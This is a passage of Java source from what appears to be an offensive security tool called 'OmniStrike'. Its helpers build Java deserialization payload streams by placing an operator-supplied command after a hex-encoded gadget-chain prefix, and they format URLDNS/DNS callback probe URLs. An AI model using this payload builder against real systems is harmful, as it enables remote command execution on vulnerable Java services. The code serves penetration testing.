    private static byte[] buildStreamTemplate(String chainName, String command, String hexPrefix) {
        try {
            byte[] prefix = hexToBytes(hexPrefix);
            byte[] cmdBytes = command.getBytes(StandardCharsets.UTF_8);

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(prefix);
            // TC_STRING (0x74) + 2-byte length + command
            bos.write(0x74);
            bos.write((cmdBytes.length >> 8) & 0xFF);
            bos.write(cmdBytes.length & 0xFF);
            bos.write(cmdBytes);

            appendChainInfo(bos, chainName, command);
            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("Template generation failed: " + e.getMessage(), e);
        }
    }

    /** Append a human-readable chain info trailer to the stream. */
    private static void appendChainInfo(ByteArrayOutputStream bos, String chainName, String command)
            throws IOException {
        byte[] info = ("\n[OmniStrike:" + chainName + "] " + command).getBytes(StandardCharsets.UTF_8);
        bos.write(0x74);
        bos.write((info.length >> 8) & 0xFF);
        bos.write(info.length & 0xFF);
        bos.write(info);
    }

    /** Find first occurrence of needle in haystack starting at fromIndex. */
    private static int indexOf(byte[] haystack, byte[] needle, int fromIndex) {
        outer:
        for (int i = fromIndex; i <= haystack.length - needle.length; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) continue outer;
            }
            return i;
        }
        return -1;
    }

    /** Sanitise arbitrary user input into a valid URL for URLDNS/DNSCallback. */
    private static String toValidUrl(String input) {
        if (input == null || input.isBlank()) {
            return "http://omnistrike.dns";
        }
        String trimmed = input.trim();
        if (trimmed.matches("^https?://[\\w.:-]+.*")) return trimmed;
        Matcher urlMatcher = Pattern.compile("https?://[\\w.:/-]+").matcher(trimmed);
        if (urlMatcher.find()) return urlMatcher.group();
        if (trimmed.matches("^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?$")) return "http://" + trimmed;
        String sanitised = trimmed.replaceAll("[^a-zA-Z0-9.-]", "-")
                                  .replaceAll("-{2,}", "-")
                                  .replaceAll("^-|-$", "");
        if (sanitised.isEmpty()) sanitised = "payload";
        if (sanitised.length() > 63) sanitised = sanitised.substring(0, 63);
        return "http://" + sanitised + ".omnistrike.dns";
    }

    static byte[] hexToBytes(String hex) {
        hex = hex.replaceAll("\\s+", "");
        byte[] bytes = new byte[hex.length() / 2];
        for (int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
        }
        return bytes;
    }
}
